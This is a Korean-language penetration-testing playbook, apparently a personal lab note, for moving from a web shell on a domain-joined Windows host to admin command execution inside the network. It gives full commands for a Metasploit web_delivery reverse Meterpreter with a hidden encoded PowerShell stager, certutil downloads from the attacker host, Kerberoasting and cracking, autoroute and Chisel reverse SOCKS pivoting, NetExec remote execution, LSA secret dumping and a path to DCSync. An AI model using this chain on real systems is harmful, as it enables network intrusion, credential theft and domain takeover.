---
tags:
  - 환경/windows
  - 환경/ad
  - 서비스/smb
  - 기능/피벗
시작상태:
  - 도메인에 연결된 Windows 호스트의 Web Shell 또는 제한된 명령 실행 확보
  - Windows 호스트에서 공격 호스트의 HTTP와 reverse handler 포트로 연결 가능
목표:
  - SPN이 설정된 서비스 계정 식별과 비밀번호 복구
  - 내부 SMB 후보 IP와 호스트 이름의 대응 관계 확인
  - 복구한 계정으로 내부 Windows 호스트에서 관리자급 원격 명령 실행
필요권한:
  - 시작 Windows 호스트의 현재 사용자 명령 실행 권한
  - Kerberoasting 요청이 가능한 일반 도메인 사용자 권한
  - 최종 SMB 대상의 로컬 관리자급 원격 실행 권한
필요정보:
  - 공격 호스트에서 수신할 IP와 포트
  - 시작 Windows 호스트에서 보이는 내부 CIDR
  - 대상 서비스 SPN 또는 SPN 계정 후보
네트워크위치:
  - Linux 공격 호스트에서 시작 Windows 호스트를 경유해 내부 Windows 대역에 접근
---

# Windows Web Shell에서 내부망 SMB 관리자 명령 실행까지

## 시나리오 개요

도메인에 연결된 Windows 호스트의 Web Shell에서 Meterpreter 세션을 만들고 안정화한 뒤 PowerView로 SPN 계정을 식별·Kerberoasting한다. 이어서 내부 대역의 SMB 응답 IP를 스캔하고, 피벗 호스트의 DNS·NetBIOS 조회와 AD 컴퓨터 객체를 이용해 각 IP의 호스트 이름을 보강한다. SPN에 들어 있는 서비스 호스트를 우선 확인하되, 복구한 계정이 실제 관리자 권한을 갖는 SMB 호스트는 후보별 인증 결과로 결정한다.

## 기준 구조

```text
Linux 공격 호스트
  -> HTTP Web Delivery / reverse Meterpreter
    -> Windows 시작 호스트의 Web Shell과 Meterpreter 세션
       -> DC LDAP·Kerberos: SPN 열거와 TGS 요청
       -> 내부 CIDR: Metasploit autoroute와 139·445/TCP 후보 스캔
       -> 내부 DNS·NetBIOS·AD: 후보 IP와 호스트 이름 매핑
       -> SOCKS: 복구한 계정으로 후보별 SMB 권한 확인
          -> 관리자 권한이 확인된 호스트에서 원격 명령 실행
```

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| Windows 명령 실행 | Web Shell 또는 제한된 셸에서 PowerShell 실행 가능 | `$PSVersionTable`, `whoami` | 셸 문법과 PowerShell 언어 모드 확인 |
| 공격 호스트 연결 | 대상에서 Web Delivery HTTP와 reverse handler 포트 연결 | `Test-NetConnection <ATTACKER_IP> -Port <PORT>` | LHOST·SRVHOST bind와 방화벽 확인 |
| AD 연결 | 현재 Windows 호스트에서 도메인·DC 단서와 LDAP·Kerberos 경로 확인 | `whoami`, `$env:USERDNSDOMAIN`, `nltest /dsgetdc:<DOMAIN>` | [[AD 도메인 컨텍스트 기본 확인]] |
| 내부망 단서 | Windows 호스트에 추가 NIC·route 또는 내부 CIDR 존재 | `ipconfig /all`, `route print -4` | 다른 피벗 후보와 내부 주소 단서 확인 |

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | Linux 공격 호스트와 Windows Web Shell | [[Metasploit Web Delivery로 Meterpreter 세션 획득]] | `session opened`, `getuid`, `sysinfo` | 세션 프로세스 확인 |
| 2 | Windows Meterpreter 세션 | [[Meterpreter 프로세스 이동과 세션 안정화]] | migration 성공과 반복 명령 가능 | PowerView 반입 |
| 3 | Linux 공격 호스트와 Windows 대상 | [[제한 환경 파일 반입]] | HTTP GET, CertUtil 성공, 파일 hash | PowerView import |
| 4 | Windows PowerShell | [[SPN 계정 열거]]과 [[Kerberoasting]] | 대상 SPN 소유 계정, TGS hash, 복구 비밀번호 | 내부 route 생성 |
| 5 | Metasploit console과 Windows Meterpreter 셸 | [[Meterpreter 라우팅과 포트 포워딩]] 후 [[AD 컴퓨터 객체 열거]] | SMB 후보 IP, PTR·NetBIOS·AD hostname, SPN 서비스 호스트의 IP | 후보별 SOCKS 인증 |
| 6 | Linux 공격 호스트 | 복구한 계정으로 후보별 SMB 인증 후 [[WMI 원격 명령 실행]] | 후보 hostname, SMB 인증, 관리자 표시, 원격 명령 출력 | 최종 호스트 상태 재평가 |

## 1. Web Shell에서 Meterpreter 세션 획득

Linux 공격 호스트의 Metasploit에서 Web Delivery를 준비한다.

```text
sudo msfconsole -q
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST <ATTACKER_IP>
msf6 exploit(multi/script/web_delivery) > set LPORT <LPORT>
msf6 exploit(multi/script/web_delivery) > set SRVHOST <ATTACKER_IP>
msf6 exploit(multi/script/web_delivery) > set SRVPORT <SRVPORT>
msf6 exploit(multi/script/web_delivery) > set TARGET 2
msf6 exploit(multi/script/web_delivery) > exploit
```

Windows Web Shell에서 Metasploit이 출력한 PowerShell 명령을 실행한다.

```powershell
powershell.exe -nop -w hidden -e <GENERATED_BASE64_COMMAND>
```

Linux 공격 호스트에서 새 세션의 대상·사용자·아키텍처를 확인한다.

```text
msf6 > sessions -l
msf6 > sessions -i <SESSION_ID>
meterpreter > getuid
meterpreter > sysinfo
```

`Using URL`과 handler 시작은 전달 준비다. `Meterpreter session ... opened`와 반복 가능한 `getuid`·`sysinfo`가 있어야 세션 획득으로 판정한다.

## 2. Meterpreter 프로세스 이동과 세션 확인

Windows 대상의 Meterpreter 프롬프트에서 현재 PID와 같은 아키텍처의 지속 중인 프로세스를 찾는다.

```text
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <TARGET_PID>
meterpreter > getpid
meterpreter > getuid
meterpreter > getprivs
```

`Migration completed successfully` 뒤에도 명령이 반복 실행되어야 한다. 이동 뒤 `getuid`가 바뀌었다면 실제 파일·서비스 접근을 확인하기 전에는 권한 상승으로 확정하지 않는다.

## 3. PowerView 반입과 Import

Linux 공격 호스트에서 PowerView가 있는 디렉터리를 HTTP로 제공한다.

```bash
cd <SERVE_DIRECTORY>
python3 -m http.server <HTTP_PORT> --bind <ATTACKER_IP>
```

Windows Meterpreter에서 운영체제 셸을 열고 쓰기 가능한 경로로 이동한 뒤 파일을 받는다.

```text
meterpreter > shell
C:\> cd <WRITABLE_DIRECTORY>
C:\> certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<HTTP_PORT>/PowerView.ps1 PowerView.ps1
C:\> powershell
PS C:\> Import-Module .\PowerView.ps1
```

확인할 출력:

- 공격 호스트 HTTP 로그의 `GET /PowerView.ps1`.
- `CertUtil: -URLCache command completed successfully`와 대상 파일 생성.
- `Import-Module` 뒤 `Get-Command Get-DomainUser`가 함수를 반환함.

## 4. 알려진 SPN의 소유 계정 식별과 Kerberoasting

SPN 계정명과 실제 SPN을 함께 출력한다.

```powershell
Get-DomainUser * -SPN | Select-Object SamAccountName,ServicePrincipalName
```

찾는 `MSSQLSvc/<MSSQL_FQDN>:<PORT>`와 같은 객체의 `SamAccountName`을 대상 계정으로 사용한다.

```powershell
Get-DomainUser -Identity '<SPN_USER>' | Get-DomainSPNTicket -Format Hashcat
```

TGS hash를 Linux 분석 호스트로 옮긴 뒤 실제 etype에 맞는 mode로 크래킹한다. 다음 예시는 etype 23일 때만 사용한다.

```bash
hashcat -m 13100 kerberoast.hashes <WORDLIST> --backend-ignore-opencl -d 1 -O -w 3
```

`$krb5tgs$` hash 수집, 평문 후보 복구, 해당 비밀번호의 현재 서비스 인증 성공은 서로 다른 상태다. 비밀번호가 복구되면 계정 잠금 정책을 확인하고 후속 인증 시도 범위를 정한다.

SPN은 서비스 종류, 서비스가 등록된 호스트와 포트를 알려 준다. 예를 들어 `MSSQLSvc/<SQL_HOST_FQDN>:1433`은 `<SQL_HOST_FQDN>`의 MSSQL 서비스와 SPN 소유 계정을 연결하지만, 그 계정이 다른 Windows 호스트의 로컬 관리자라는 사실은 알려 주지 않는다. SPN의 호스트는 첫 서비스 확인 대상이고, 관리자 원격 실행 대상은 뒤의 SMB 권한 확인 결과로 정한다.

## 5. 내부 SMB 후보 스캔과 호스트 이름 매핑

Meterpreter 프롬프트에서 내부 NIC를 확인한 뒤 세션을 백그라운드로 전환한다. 서버나 세션을 다시 연결했다면 `sessions -l`에서 현재 session ID를 다시 확인하고 post 모듈로 내부 CIDR을 추가한다.

```text
meterpreter > ipconfig
meterpreter > background
msf6 > sessions -l
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION <SESSION_ID>
msf6 post(multi/manage/autoroute) > set CMD add
msf6 post(multi/manage/autoroute) > set SUBNET <INTERNAL_SUBNET>
msf6 post(multi/manage/autoroute) > set NETMASK <NETMASK>
msf6 post(multi/manage/autoroute) > run
msf6 > route print
```

`route print`에서 대상 subnet·netmask의 gateway가 현재 살아 있는 session ID인지 확인한다. 레거시 `run autoroute -s`는 폐기 경고와 `Invalid :session` 오류가 발생할 수 있으므로 새 route 구성에는 사용하지 않는다.

`Invalid :session, expected Session object`가 출력됐다면 같은 route를 바로 다시 추가하지 않는다. `sessions -l`과 `route print`를 먼저 확인한다. 대상 route가 현재 session에 연결되어 있으면 같은 console의 TCP scanner로 기능을 검증하고, 이전 session을 가리키면 해당 route만 제거한 뒤 현재 session으로 다시 추가한다.

Metasploit route로 내부 139·445/TCP 응답 IP를 찾는다. 이 단계의 결과는 SMB 후보 주소이며 호스트 이름과 계정 권한은 아직 알 수 없다.

```text
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <INTERNAL_CIDR>
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 139,445
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 1
msf6 auxiliary(scanner/portscan/tcp) > set CONCURRENCY 10
msf6 auxiliary(scanner/portscan/tcp) > run
```

`TCP OPEN`이 반환된 주소만 `<SMB_CANDIDATE_1>`, `<SMB_CANDIDATE_2>`처럼 후보 목록에 남긴다. 같은 Windows 시작 호스트의 셸에서 후보 IP를 PTR 레코드로 역방향 조회한다.

```text
msf6 > sessions -i <SESSION_ID>
meterpreter > shell
C:\> powershell -NoProfile
PS C:\> '<SMB_CANDIDATE_1>','<SMB_CANDIDATE_2>','<SMB_CANDIDATE_3>' | ForEach-Object { $ip=$_; $ptr=Resolve-DnsName -Name $ip -Type PTR -ErrorAction SilentlyContinue; [pscustomobject]@{IPAddress=$ip;HostName=($ptr.NameHost -join ',')} }
```

PTR 레코드가 있으면 후보 IP와 FQDN이 한 행에 나온다. 빈 `HostName`은 해당 IP가 호스트가 아니라는 뜻이 아니라 reverse zone에 PTR 레코드가 없다는 뜻이다. PTR이 비어 있는 후보는 Windows 시작 호스트에서 NetBIOS Node Status를 확인한다.

```cmd
nbtstat -A <SMB_CANDIDATE>
```

`<00> UNIQUE`의 이름은 워크스테이션 서비스의 컴퓨터 이름이고, `<20> UNIQUE`가 함께 있으면 파일 서버 서비스 이름도 같은 호스트에서 확인된 것이다. UDP/137 차단이나 NetBIOS 비활성화로 응답이 없을 수 있으므로 실패를 호스트 부재로 해석하지 않는다.

PTR과 NetBIOS로 이름이 나오지 않으면 이미 반입한 PowerView로 AD 컴퓨터 객체의 FQDN을 가져와 A 레코드를 조회하고, 그 IP가 SMB 후보 목록에 있는지 대조한다.

```powershell
Import-Module '<POWERVIEW_PATH>'
Get-DomainComputer -Properties dNSHostName | Where-Object { $_.dNSHostName } | ForEach-Object {
    $hostName = $_.dNSHostName
    Resolve-DnsName $hostName -Type A -ErrorAction SilentlyContinue |
        Where-Object { $_.Type -eq 'A' } |
        Select-Object @{Name='HostName';Expression={$hostName}},IPAddress
}
```

SPN에 포함된 호스트도 같은 후보 목록과 대조한다. SPN 문자열에서 서비스 호스트를 추출해 A 레코드를 확인할 수 있다.

```powershell
$spn = 'MSSQLSvc/<SQL_HOST_FQDN>:<PORT>'
$spnHost = (($spn -split '/',2)[1] -split ':',2)[0]
Resolve-DnsName $spnHost -Type A | Select-Object Name,IPAddress
```

이 결과로 `<SQL_HOST_FQDN> -> <SQL_HOST_IP>`는 확인할 수 있다. 그러나 `<SPN_USER>`의 비밀번호가 어느 SMB 후보에서 관리자 원격 실행으로 이어지는지는 아직 확인되지 않았다. PTR·NetBIOS·AD 조회가 모두 실패한 후보도 버리지 않고, 다음 단계의 SMB 협상 출력에서 호스트 이름을 최종 보강한다.

## 6. SOCKS5와 ProxyChains 연결

Linux 공격 호스트의 Metasploit console에서 SOCKS5 listener를 실행한다.

```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
msf6 auxiliary(server/socks_proxy) > run -j
msf6 > jobs -l
```

`show options`에서 현재 기본값이 `SRVHOST 0.0.0.0`, `SRVPORT 1080`, `VERSION 5`이면 별도 설정 없이 job을 실행한다. `0.0.0.0`으로 수신해도 같은 공격 호스트의 ProxyChains는 `127.0.0.1:1080`으로 연결할 수 있다. 다른 인터페이스에서 SOCKS 연결을 받을 필요가 없을 때만 `set SRVHOST 127.0.0.1`로 제한한다.

전역 `/etc/proxychains.conf`를 바꾸지 않고 Linux 공격 호스트의 현재 디렉터리에 이 경로 전용 `meterpreter-socks.conf` 파일을 만든다. 파일명은 임의로 정할 수 있지만 아래 `-f` 인수와 같아야 한다.

```bash
cat > ./meterpreter-socks.conf <<'EOF'
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080
EOF

sed -n '1,20p' ./meterpreter-socks.conf
```

`sed` 출력의 SOCKS 버전·주소·포트가 Metasploit `socks_proxy`의 `VERSION 5`, `SRVPORT 1080`과 일치하는지 확인한다. Metasploit이 `SRVHOST 0.0.0.0`으로 수신 중이면 로컬 클라이언트의 `127.0.0.1:1080` 연결을 포함하므로 두 주소가 문자열 그대로 같을 필요는 없다.

후보 전체를 한 번에 처리하는 shell loop는 사용하지 않는다. reverse Meterpreter transport는 명령 채널과 피벗 채널을 함께 사용하므로, SMB 후보를 한 주소씩 확인하고 각 요청 사이에 세션 응답 상태를 확인한다. 외부 도구를 실행하기 전에 같은 console에서 세션, route와 SOCKS job을 확인한다.

```text
msf6 > sessions -l
msf6 > route print
msf6 > jobs -l
msf6 > sessions -i <SESSION_ID>
meterpreter > getuid
meterpreter > background
```

- Meterpreter `getuid`가 즉시 반환되어야 한다. timeout이면 ProxyChains 요청을 시작하지 않고 세션부터 복구한다.
- route 표에는 `<INTERNAL_SUBNET> <NETMASK> <SESSION_ID>`, `jobs -l`에는 `auxiliary/server/socks_proxy`가 있어야 한다.
- autoroute와 SOCKS job은 같은 `msfconsole`에 있어야 한다.
- 첫 후보 요청이 timeout이면 다음 후보로 넘어가지 않고 즉시 `getuid`를 다시 확인한다.

### Metasploit SOCKS 반복 타임아웃 시 Chisel 전환

ProxyChains의 첫 TCP 연결은 `OK`지만 같은 명령의 다음 연결이 timeout되고 Meterpreter `getuid`까지 응답하지 않으면, SMB 인증 실패로 판단하지 않는다. Meterpreter의 명령 채널과 피벗 채널이 함께 멈춘 상태이므로 외부 요청을 중단하고 새 Meterpreter 세션을 확보한 뒤 [[Chisel SOCKS 터널링]]으로 전환한다.

Linux 공격 호스트에서 reverse tunnel server를 먼저 실행한다.

```bash
./chisel server --reverse -p <CHISEL_SERVER_PORT>
```

새 Windows Meterpreter 세션으로 Windows x64용 `chisel.exe`를 전송하고 reverse SOCKS client를 실행한다.

```text
meterpreter > upload <KALI_WINDOWS_AMD64_CHISEL> C:\\Windows\\Temp\\chisel.exe
meterpreter > execute -f C:\\Windows\\Temp\\chisel.exe -a "client <ATTACKER_VPN_IP>:<CHISEL_SERVER_PORT> R:1083:socks" -H
```

Linux 공격 호스트에서 Chisel server의 client 연결 로그와 `1083/TCP` listener를 확인한 뒤 전용 설정 파일을 만든다.

```bash
ss -ltnp 'sport = :1083'

cat > ./chisel-socks.conf <<'EOF'
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1083
EOF

proxychains -f ./chisel-socks.conf nc -vz <SMB_CANDIDATE> 445
```

`ss`에는 `chisel`이 `127.0.0.1:1083`에서 수신 중이어야 하고, `nc`는 ProxyChains `OK`와 대상 `445/TCP` 연결 성공을 함께 반환해야 한다. 이 경로는 Metasploit `autoroute`와 `socks_proxy`를 사용하지 않는다.

## 7. 복구한 계정으로 SMB 후보별 권한 확인 후 원격 명령 실행

SPN의 서비스 호스트와 일치하는 SMB 후보부터 복구한 계정으로 인증한다. SPN 호스트에서 관리자 표시가 없으면 나머지 SMB 후보를 한 주소씩 확인한다. 후보 전체를 자동 루프로 실행하지 않는다.

현재 권장 도구인 NetExec을 사용할 때:

```bash
proxychains -f ./meterpreter-socks.conf nxc smb <SQL_HOST_IP> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
proxychains -f ./meterpreter-socks.conf nxc smb <NEXT_SMB_CANDIDATE> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
```

NetExec의 각 행에서 IP 옆에 표시되는 hostname을 앞의 PTR·NetBIOS·AD 결과에 추가한다. 도메인 계정의 `[+]` 인증은 해당 계정이 그 호스트에서 관리자라는 뜻이 아니다. `Pwn3d!` 또는 admin 표시가 나온 IP만 `<INTERNAL_TARGET>`으로 선택하고 실제 명령 실행으로 확인한다.

```bash
proxychains -f ./meterpreter-socks.conf nxc smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' -x 'whoami /all'
```

기존 CrackMapExec 환경을 재현할 때도 같은 순서로 후보를 하나씩 확인한다.

```bash
proxychains -f ./meterpreter-socks.conf crackmapexec smb <SMB_CANDIDATE> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
proxychains -f ./meterpreter-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' -x 'whoami /all'
```

Chisel 경로로 전환했고 `Pwn3d!` 또는 원격 `whoami /all`로 `<SPN_USER>`의 관리자급 원격 작업 권한을 확인했으면, 같은 대상에서 LSA secret과 캐시된 도메인 로그온 정보를 수집한다. 단순한 SMB `[+]` 인증 성공만으로 `--lsa`를 실행하지 않는다.

```bash
proxychains -f ./chisel-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' --lsa
```

`Dumping LSA Secrets`, 서비스 계정 secret, `DPAPI_SYSTEM` 또는 cached domain logon 출력은 각각 [[Windows LSA Secrets 추출]]과 [[Windows Cached Domain Credentials 추출]]에서 해석한다. 출력된 값은 다른 호스트의 로그인 성공이나 관리자 권한을 보장하지 않으므로 계정·대상 서비스를 식별한 뒤 별도로 검증한다.

출력에 `$DCC2$`가 아니라 `<DOMAIN>\<RECOVERED_USER>:<PLAINTEXT_PASSWORD>` 형식이 있으면 계정명이 연결된 평문 AD 자격 증명을 새로 얻은 상태다. `<HOST>$:plain_password_hex:<HEX>`와 혼동하지 않는다. 이 계정의 이름을 PowerView에서 SID로 변환하고 [[AD 계정의 디렉터리 복제 권한 확인]]을 수행한다. 같은 SID에 `DS-Replication-Get-Changes`와 `DS-Replication-Get-Changes-All`이 모두 확인된 경우에만 해당 자격 증명을 요청자로 사용해 [[DCSync]]로 이어 간다.

| 출력 | 확인된 상태 | 아직 확인하지 못한 것 |
|---|---|---|
| ProxyChains `OK` | SOCKS를 통한 대상 TCP 연결 | SMB 인증과 권한 |
| NetExec의 IP 옆에 hostname 표시 | SMB 협상으로 후보 IP의 서버 이름 보강 | 계정 권한 |
| SMB `[+]` | 계정·비밀번호로 해당 후보의 SMB 인증 성공 | 관리자 원격 실행 |
| `Pwn3d!` 또는 admin 표시 | 해당 후보에서 관리자급 원격 작업 가능성 확인 | 실제 명령 실행 주체·token |
| `Executed command`와 `whoami /all` | 내부 대상의 원격 명령 실행과 실행 사용자 | Domain Admin·DCSync 등 별도 도메인 권한 |
| `Dumping LSA Secrets`와 secret 출력 | 대상에서 LSA secret 또는 캐시된 도메인 로그온 정보 추출 | 각 계정의 현재 유효성·원격 접근·관리자 권한 |
| `<DOMAIN>\<RECOVERED_USER>:<PLAINTEXT_PASSWORD>` | 계정명이 연결된 평문 AD 자격 증명 확보 | 계정의 실제 도메인 객체 권한과 DCSync 가능 여부 |
| 같은 SID의 `Get-Changes`와 `Get-Changes-All` | 복구한 계정의 DCSync 권한 전제 확인 | 해당 계정 자격 증명으로 DRSUAPI 요청 성공 여부 |

## 실패 시 분기

| 멈춘 단계·출력 | 가능한 원인 | 확인 명령 | 이어갈 단계 |
|---|---|---|---|
| Web Delivery URL은 있으나 session 없음 | 대상 명령 미실행·HTTP stage·callback 실패 | 대상 PowerShell 오류, HTTP 로그, handler 상태 | 1단계 |
| migration 실패 | PID 종료·architecture·현재 privilege·보호 프로세스 | `ps`, `getpid`, `getprivs` | 기존 세션 유지 또는 다른 프로세스 선택 |
| PowerView Import 실패 | 파일 손상·실행 정책·PowerShell 제약 | 파일 SHA-256, `Get-Command`, 구체적인 Import 오류 | 3단계 |
| SPN 목록이 비어 있음 | AD 계정·도메인·LDAP 경로·조회 범위 문제 | `whoami`, DC 연결, `Get-DomainUser` 기본 조회 | 4단계 |
| SMB 후보 IP는 있으나 PTR 결과가 비어 있음 | reverse DNS 레코드 부재 가능 | `nbtstat -A`, AD 컴퓨터 FQDN의 A 레코드와 대조 | 5단계의 이름 매핑 |
| PTR·NetBIOS 모두 이름을 반환하지 않음 | reverse zone 부재·UDP/137 차단·NetBIOS 비활성화 가능 | `Get-DomainComputer`와 `Resolve-DnsName`, 마지막으로 후보별 NetExec 출력 | 5~7단계 |
| SPN에 SQL hostname이 있으나 관리자 대상은 모름 | SPN은 서비스 호스트를 나타낼 뿐 다른 호스트의 관리자 권한을 나타내지 않음 | SQL host IP를 후보와 대조한 뒤 복구 계정으로 후보별 SMB 인증 | 7단계 |
| `smb_version`에 운영체제·도메인만 표시됨 | SMB 서비스 정보만 확인됐고 hostname 또는 계정 권한은 미확정 | PTR·NetBIOS·AD 객체 또는 후보별 NetExec 출력 확인 | 5~7단계 |
| `Invalid :session` 뒤 현재 session route가 있음 | route 추가 뒤 session 정보 처리에서 오류가 발생했을 가능성 | `sessions -l`, `route print`, 단일 대상 Metasploit TCP scanner | scanner가 성공하면 5단계 계속 진행 |
| `Invalid :session` 뒤 route가 없거나 이전 session을 가리킴 | session 재연결 뒤 route 미등록 또는 오래된 gateway | `sessions -l`, `route print`, `ipconfig` | 오래된 route만 제거하고 post autoroute로 현재 session에 재구성 |
| TCP scanner 결과 없음 | 잘못된 CIDR·route·방화벽·포트 선택 | 피벗 호스트에서 단일 대상 포트 확인 | 5단계 |
| SOCKS job은 있으나 ProxyChains 실패 | VERSION·주소·포트 불일치 | `show options`, `jobs -l`, config의 ProxyList | 6단계 |
| 첫 단일 ProxyChains 요청이 socket timeout | SOCKS listener 이후 Meterpreter가 목표 연결을 만들지 못함 | 추가 요청을 중단하고 `getuid`, `sessions -l`, `route print`, `jobs -l` 확인 | 설정 오류를 한 번 교정한 뒤 반복되면 Chisel 전환 |
| ProxyChains timeout 뒤 `getuid`도 timeout | Meterpreter transport의 명령·피벗 채널이 함께 응답하지 않음 | 외부 요청을 더 만들지 않고 새 세션 확보 | 새 세션에서 Chisel 전송·실행 후 `chisel-socks.conf` 사용 |
| SMB 인증 성공 후 `-x` 실패 | 관리자 권한·원격 실행 방식·RPC 경로 부족 | `Pwn3d!`, 135·445와 도구의 exec method | 다른 원격 서비스·실행 방식 검토 |
| `--lsa`가 access denied 또는 dump 오류 반환 | SMB 인증은 성공했지만 원격 관리자급 작업 권한 또는 Remote Registry·hive 접근이 부족함 | `Pwn3d!`, `whoami /all`, 첫 dump 오류 | 인증 자료를 바꾸지 말고 대상 권한과 원격 작업 조건 재확인 |

## 변경 영향과 복구

| 변경 대상 | 기록할 기존 값 | 예상 영향 | 복구 명령 |
|---|---|---|---|
| Metasploit 내부 route | CIDR, netmask, session ID | 해당 내부 대역 트래픽이 피벗 세션으로 전달됨 | `route remove <INTERNAL_SUBNET> <NETMASK> <SESSION_ID>` |
| Metasploit SOCKS job | job ID, VERSION, SRVPORT | 공격 호스트에 SOCKS listener 유지 | `jobs -k <SOCKS_JOB_ID>` |
| 공격 호스트의 `meterpreter-socks.conf` | 생성한 경로와 파일명 | 이 경로 전용 ProxyChains 설정 파일이 남음 | `rm -f ./meterpreter-socks.conf` |
| 공격 호스트의 Chisel server와 `chisel-socks.conf` | server PID, 수신 포트, 설정 파일 경로 | reverse tunnel listener와 ProxyChains 설정 파일이 남음 | Chisel server 종료 후 `rm -f ./chisel-socks.conf` |
| Windows 피벗 호스트의 `chisel.exe`와 client process | 파일 경로와 PID | reverse SOCKS client와 실행 파일이 남음 | 해당 PID 종료 후 `del C:\\Windows\\Temp\\chisel.exe` |
| Windows 대상의 PowerView 파일 | 저장 경로와 hash | 대상 디스크에 스크립트 파일 생성 | `Remove-Item -LiteralPath '<POWERVIEW_PATH>' -Force` |
| 공격 호스트 HTTP 서버 | PID와 bind 포트 | 파일 제공 listener 유지 | HTTP 서버 프로세스 종료 |

## 완료 기준

- Windows Web Shell에서 시작한 Meterpreter 세션의 대상·사용자·아키텍처와 이동 뒤 생존 상태가 확인됨.
- 알려진 SPN과 소유 계정을 같은 PowerView 객체에서 확인하고 TGS hash·복구 비밀번호 상태를 분리함.
- Metasploit route 스캔으로 내부 139·445/TCP 응답 IP 목록을 확보하고, Meterpreter SOCKS가 반복 실패하면 Chisel SOCKS로 전환함.
- PTR·NetBIOS·AD 컴퓨터 객체와 SMB 협상 결과로 후보 IP와 hostname의 대응 관계를 보강함.
- SPN의 서비스 호스트와 복구 계정이 관리자 권한을 갖는 SMB 호스트를 구분함.
- 관리자 표시가 나온 SMB 후보에서 실제 원격 `whoami /all` 출력을 확인함.
- LSA 수집을 선택했다면 서비스 secret·`DPAPI_SYSTEM`·cached domain logon을 서로 구분하고 후속 검증 경로를 연결함.
- LSA에서 평문 AD 자격 증명을 얻었다면 대상 계정 SID의 복제 권한을 확인하고, 두 필수 권한이 모두 있을 때만 DCSync 요청자로 선택함.
- 최종 원격 명령 실행 뒤에는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]에서 대상 호스트의 실제 계정·권한·네트워크 위치를 다시 확인함.

## 관련 노트

- [[Metasploit Web Delivery로 Meterpreter 세션 획득]]
- [[Meterpreter 프로세스 이동과 세션 안정화]]
- [[제한 환경 파일 반입]]
- [[PowerView]]
- [[SPN 계정 열거]]
- [[Kerberoasting]]
- [[AD 컴퓨터 객체 열거]]
- [[AD DNS 레코드 열거]]
- [[Meterpreter 라우팅과 포트 포워딩]]
- [[Chisel SOCKS 터널링]]
- [[chisel]]
- [[proxychains]]
- [[crackmapexec]]
- [[netexec]]
- [[Windows LSA Secrets 추출]]
- [[Windows Cached Domain Credentials 추출]]
- [[AD 계정의 디렉터리 복제 권한 확인]]
- [[DCSync]]
- [[WMI 원격 명령 실행]]
- [[Meterpreter 세션 후속 행동]]
- [[내부망 경로 확보 후 피벗 구성]]
